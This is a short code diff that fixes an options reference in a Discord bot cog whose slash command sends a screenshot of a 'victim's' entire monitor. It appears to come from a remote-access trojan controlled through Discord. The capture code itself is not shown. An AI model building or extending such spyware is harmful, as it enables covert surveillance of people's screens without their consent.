@@ -12,7 +12,7 @@ class GetScreenshot(commands.Cog):
         
     @commands.slash_command(
         description="Sends screenshot of entire monitor",
-        options=[self.bot.victim],
+        options=[bot.victim],
     )
     async def get_screenshot(self, ctx, victim):
         if str(victim) == str(self.ip_addr):
